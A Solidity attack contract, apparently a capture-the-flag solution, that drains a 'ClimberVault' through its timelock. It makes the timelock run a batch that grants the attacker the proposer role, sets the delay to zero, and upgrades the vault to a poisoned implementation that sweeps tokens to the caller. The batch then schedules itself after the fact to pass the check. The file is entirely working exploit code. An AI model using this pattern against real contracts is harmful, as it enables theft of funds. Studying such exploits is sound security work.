// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IClimberTimelock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function PROPOSER_ROLE() external view returns(bytes32);
}

contract Attacc {

    /*
    
    -Deploy poisoned implementation, a new implementation with malicious code (sweep())
    -call init(), this exec a fn that grantRoles to this contract, and trigger an implementation upgrade to poisoned impl
    -it schedules a new action too, so you can bypass require() in ClimberTimelock.sol line 108
    
    */

    IClimberTimelock climberTimelock;
    address climberVault;
    address token;

    address[] targets = new address[](4);
    uint256[] values = new uint256[](4);
    bytes[] dataElements = new bytes[](4);

    constructor(address _climberTimelock, address _climberVault, address _token) {
        climberTimelock = IClimberTimelock(_climberTimelock);
        climberVault = _climberVault;
        token = _token;
    }

    function schedule() external {
        climberTimelock.schedule(targets, values, dataElements, 0);
    }

    function init(address _poisonedImpl) external {

        targets[0] = address(climberTimelock); //Grant role PROPOSER
        targets[1] = address(climberTimelock); //UpdateDelay
        targets[2] = climberVault; //UpgradeToAndCall
        targets[3] = address(this); //schedule

        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        dataElements[0] = abi.encodeWithSignature("grantRole(bytes32,address)",climberTimelock.PROPOSER_ROLE(),address(this)); //Grant role PROPOSER
        dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)",0); //UpdateDelay
        dataElements[2] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)",_poisonedImpl,abi.encodeWithSignature("sweep(address,address)",token,msg.sender)); //UpgradeToAndCall
        dataElements[3] = abi.encodeWithSignature("schedule()"); //schedule

        climberTimelock.execute(targets, values, dataElements, 0);

    }

}